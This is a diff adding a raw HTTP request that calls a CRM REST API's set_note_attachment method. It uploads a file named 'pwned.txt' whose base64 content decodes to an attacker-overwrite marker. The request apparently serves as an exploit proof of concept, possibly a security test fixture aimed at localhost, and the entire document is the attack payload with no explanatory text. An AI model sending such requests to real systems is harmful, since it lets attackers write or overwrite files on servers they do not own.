@@ -1,0 +1,5 @@
+POST /service/v4_1/rest.php HTTP/1.1
+Host: localhost:33116
+Content-Type: application/x-www-form-urlencoded
+
+method=set_note_attachment&input_type=JSON&response_type=JSON&rest_data=["fe16ae1c04febb0d53a68e86eb630ab9",{"id": "6387cd56-ae24-4b8e-950c-4ad6ede69680", "filename": "pwned.txt", "file": "QVRUQUNLRVItT1ZFUldSSVRFLWF0a18yY2Y0YjY3MAo="}]
